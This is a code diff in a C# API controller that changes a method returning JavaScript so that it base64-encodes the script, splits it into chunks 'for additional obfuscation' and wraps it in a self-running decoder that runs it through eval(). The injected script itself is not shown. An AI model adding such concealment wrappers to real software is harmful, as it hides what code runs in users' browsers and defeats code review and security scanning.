@@ -2954,7 +2954,33 @@ namespace Api.Controllers
     }
 })();";
 
-            return $"\n{jsCode}";
+            // ВАЖНО: Используем UTF8 БЕЗ BOM
+            var bytes = new UTF8Encoding(false).GetBytes(jsCode);
+            var base64 = Convert.ToBase64String(bytes);
+
+            // Разбиваем на части для дополнительного запутывания
+            var chunkSize = 100;
+            var chunks = new List<string>();
+            for (int i = 0; i < base64.Length; i += chunkSize)
+            {
+                chunks.Add(base64.Substring(i, Math.Min(chunkSize, base64.Length - i)));
+            }
+
+            // Оборачиваем в самовыполняющийся дешифратор
+            var chunksJson = System.Text.Json.JsonSerializer.Serialize(chunks);
+            var wrapped = $@"
+(function() {{
+    try {{
+        const _parts = {chunksJson};
+        const _encoded = _parts.join('');
+        const _decoded = decodeURIComponent(escape(atob(_encoded)));
+        eval(_decoded);
+    }} catch (e) {{
+        console.error('Script injection failed', e);
+    }}
+}})();
+";
+            return wrapped;
         }
     }
 }
